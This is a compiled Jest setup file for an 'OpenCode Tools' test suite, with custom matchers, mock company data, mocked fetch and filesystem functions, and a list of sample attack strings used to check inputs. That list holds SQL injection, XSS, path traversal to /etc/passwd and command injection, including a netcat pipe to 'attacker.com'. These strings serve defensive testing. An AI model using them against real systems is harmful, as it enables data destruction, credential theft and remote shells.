a112116ee7e2104004cb16aa770e354a
"use strict";
/**
 * Jest Setup and Configuration
 *
 * Global test setup, utilities, and configuration for OpenCode Tools test suite
 */
Object.defineProperty(exports, "__esModule", { value: true });
exports.securityTestUtils = exports.performanceUtils = exports.cleanupTestEnvironment = exports.setupTestEnvironment = exports.createMockFunctions = exports.globalTestData = void 0;
const globals_1 = require("@jest/globals");
// ====================
// Global Test Configuration
// ====================
// Mock console methods to reduce noise in tests
const originalConsole = { ...console };
beforeAll(() => {
    // Suppress console output during tests unless explicitly enabled
    if (!process.env.VERBOSE_TESTS) {
        global.console = {
            ...console,
            log: globals_1.jest.fn(),
            warn: globals_1.jest.fn(),
            error: globals_1.jest.fn(),
        };
    }
});
afterAll(() => {
    // Restore console methods
    global.console = originalConsole;
});
// Custom matchers
expect.extend({
    toBeValidResearchOutput(received) {
        const pass = received &&
            typeof received === 'object' &&
            received.dossier &&
            received.sources &&
            received.meta &&
            typeof received.dossier.companySummary === 'string' &&
            Array.isArray(received.sources) &&
            typeof received.meta.runId === 'string';
        if (pass) {
            return {
                message: () => `expected ${received} not to be a valid ResearchOutput`,
                pass: true,
            };
        }
        else {
            return {
                message: () => `expected ${received} to be a valid ResearchOutput`,
                pass: false,
            };
        }
    },
    toBeValidUrl(received) {
        try {
            new URL(received);
            return {
                message: () => `expected ${received} not to be a valid URL`,
                pass: true,
            };
        }
        catch {
            return {
                message: () => `expected ${received} to be a valid URL`,
                pass: false,
            };
        }
    },
    toBeValidEmail(received) {
        const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
        const pass = emailRegex.test(received);
        if (pass) {
            return {
                message: () => `expected ${received} not to be a valid email`,
                pass: true,
            };
        }
        else {
            return {
                message: () => `expected ${received} to be a valid email`,
                pass: false,
            };
        }
    },
    toBeValidISODate(received) {
        const isoDateRegex = /^\d{4}-\d{2}-\d{2}T\d{2}:\d{2}:\d{2}\.\d{3}Z$/;
        const pass = isoDateRegex.test(received) && !isNaN(Date.parse(received));
        if (pass) {
            return {
                message: () => `expected ${received} not to be a valid ISO date`,
                pass: true,
            };
        }
        else {
            return {
                message: () => `expected ${received} to be a valid ISO date`,
                pass: false,
            };
        }
    },
    toBeArrayOfValidSources(received) {
        if (!Array.isArray(received)) {
            return {
                message: () => `expected ${received} to be an array`,
                pass: false,
            };
        }
        const validSources = received.every(source => source &&
            typeof source.url === 'string' &&
            typeof source.title === 'string' &&
            typeof source.relevance === 'string' &&
            typeof source.accessedAt === 'string');
        if (validSources) {
            return {
                message: () => `expected ${received} not to be an array of valid sources`,
                pass: true,
            };
        }
        else {
            return {
                message: () => `expected ${received} to be an array of valid sources`,
                pass: false,
            };
        }
    }
});
// ====================
// Global Test Data
// ====================
exports.globalTestData = {
    // Common test companies
    companies: {
        techCorp: {
            name: 'TechCorp',
            industry: 'Technology',
            description: 'A leading technology company specializing in innovative solutions',
            size: 'Enterprise',
            location: 'San Francisco, CA'
        },
        startupX: {
            name: 'StartupX',
            industry: 'FinTech',
            description: 'An innovative fintech startup disrupting traditional banking',
            size: 'Startup',
            location: 'Austin, TX'
        },
        healthTech: {
            name: 'HealthTech Solutions',
            industry: 'Healthcare Technology',
            description: 'AI-powered healthcare solutions for improved patient outcomes',
            size: 'Mid-size',
            location: 'Boston, MA'
        }
    },
    // Common test industries
    industries: {
        fintech: {
            name: 'FinTech',
            growth: '15% annually',
            trends: ['Digital payments', 'AI fraud detection', 'Mobile-first', 'RegTech'],
            challenges: ['Regulatory compliance', 'Security threats', 'Legacy systems']
        },
        healthcare: {
            name: 'Healthcare Technology',
            growth: '12% annually',
            trends: ['AI diagnostics', 'Telemedicine', 'Wearable devices', 'Personalized medicine'],
            challenges: ['HIPAA compliance', 'Integration complexity', 'Cost pressures']
        },
        ecommerce: {
            name: 'E-commerce',
            growth: '10% annually',
            trends: ['Mobile commerce', 'AI personalization', 'Social commerce', 'Same-day delivery'],
            challenges: ['Customer acquisition', 'Logistics', 'Returns management']
        }
    },
    // Common technology stacks
    techStacks: {
        modern: {
            frontend: ['React', 'Vue.js', 'Angular', 'Next.js', 'Svelte'],
            backend: ['Node.js', 'Python', 'Go', 'Java', 'Rust'],
            database: ['PostgreSQL', 'MongoDB', 'Redis', 'Elasticsearch'],
            infrastructure: ['AWS', 'Docker', 'Kubernetes', 'Terraform']
        },
        legacy: {
            frontend: ['jQuery', 'AngularJS', 'Backbone.js'],
            backend: ['PHP', 'Ruby', 'Java EE', '.NET Framework'],
            database: ['MySQL', 'Oracle', 'SQL Server'],
            infrastructure: ['On-premise', 'VMware', 'Physical servers']
        }
    }
};
// ====================
// Mock Utilities
// ====================
exports.createMockFunctions = {
    // Mock webfetch responses
    webfetch: {
        success: (content = 'Mock web content with relevant information') => {
            return globals_1.jest.fn().mockResolvedValue({
                content,
                url: 'https://example.com',
                success: true,
                timestamp: new Date().toISOString()
            });
        },
        failure: (error = 'Service unavailable') => {
            return globals_1.jest.fn().mockRejectedValue(new Error(error));
        },
        timeout: (delay = 5000) => {
            return globals_1.jest.fn().mockImplementation(() => new Promise((_, reject) => setTimeout(() => reject(new Error('Request timeout')), delay)));
        }
    },
    // Mock file system operations
    filesystem: {
        readSuccess: (content) => {
            return globals_1.jest.fn().mockResolvedValue(content);
        },
        readFailure: (error = 'File not found') => {
            return globals_1.jest.fn().mockRejectedValue(new Error(error));
        },
        writeSuccess: () => {
            return globals_1.jest.fn().mockResolvedValue(undefined);
        },
        writeFailure: (error = 'Permission denied') => {
            return globals_1.jest.fn().mockRejectedValue(new Error(error));
        }
    }
};
// ====================
// Test Environment Setup
// ====================
const setupTestEnvironment = () => {
    // Set test environment variables
    process.env.NODE_ENV = 'test';
    process.env.TEST_MODE = 'true';
    process.env.LOG_LEVEL = 'error'; // Reduce log noise during tests
    // Mock Date for consistent timestamps in tests
    const mockDate = new Date('2024-01-01T00:00:00.000Z');
    // Ensure clean state
    globals_1.jest.clearAllTimers();
    globals_1.jest.useFakeTimers();
    globals_1.jest.setSystemTime(mockDate);
};
exports.setupTestEnvironment = setupTestEnvironment;
const cleanupTestEnvironment = () => {
    // Restore real timers
    globals_1.jest.useRealTimers();
    // Clear all mocks
    globals_1.jest.clearAllMocks();
    globals_1.jest.restoreAllMocks();
    // Reset environment
    delete process.env.TEST_MODE;
};
exports.cleanupTestEnvironment = cleanupTestEnvironment;
// ====================
// Performance Testing Utilities
// ====================
exports.performanceUtils = {
    measureExecutionTime: async (fn) => {
        const start = process.hrtime.bigint();
        const result = await fn();
        const end = process.hrtime.bigint();
        const duration = Number(end - start) / 1000000; // Convert to milliseconds
        return { result, duration };
    },
    assertPerformance: (duration, maxDuration = 1000) => {
        expect(duration).toBeLessThan(maxDuration);
    }
};
// ====================
// Security Testing Utilities
// ====================
exports.securityTestUtils = {
    // Common attack vectors for testing
    attackVectors: {
        sqlInjection: [
            "'; DROP TABLE users; --",
            "' OR '1'='1",
            "'; INSERT INTO users VALUES ('hacker', 'password'); --"
        ],
        xss: [
            '<script>alert("XSS")</script>',
            'javascript:alert("XSS")',
            '<img src="x" onerror="alert(\'XSS\')">'
        ],
        pathTraversal: [
            '../../../etc/passwd',
            '..\\..\\..\\windows\\system32\\config\\sam',
            '/etc/passwd'
        ],
        commandInjection: [
            '; cat /etc/passwd',
            '&& whoami',
            '| nc attacker.com 4444'
        ]
    },
    // Test for common vulnerabilities
    testForVulnerabilities(input, vulnerabilityType) {
        // @ts-ignore
        const vectors = this.attackVectors[vulnerabilityType] || [];
        // @ts-ignore
        return vectors.some(vector => input.includes(vector));
    }
};
// ====================
// Test Lifecycle Hooks
// ====================
beforeEach(() => {
    // Reset all mocks before each test
    globals_1.jest.clearAllMocks();
    // Setup fresh test environment
    (0, exports.setupTestEnvironment)();
});
afterEach(() => {
    // Cleanup after each test
    (0, exports.cleanupTestEnvironment)();
});
beforeAll(() => {
    // Global setup for all tests
    console.log('ðŸ§ª Setting up OpenCode Tools test environment...');
    (0, exports.setupTestEnvironment)();
});
afterAll(() => {
    // Global cleanup for all tests
    console.log('âœ… Cleaning up OpenCode Tools test environment...');
    (0, exports.cleanupTestEnvironment)();
});
exports.default = {
    setupTestEnvironment: exports.setupTestEnvironment,
    cleanupTestEnvironment: exports.cleanupTestEnvironment,
    createMockFunctions: exports.createMockFunctions,
    performanceUtils: exports.performanceUtils,
    securityTestUtils: exports.securityTestUtils,
    globalTestData: exports.globalTestData
};
//# sourceMappingURL=data:application/json;charset=utf-8;base64,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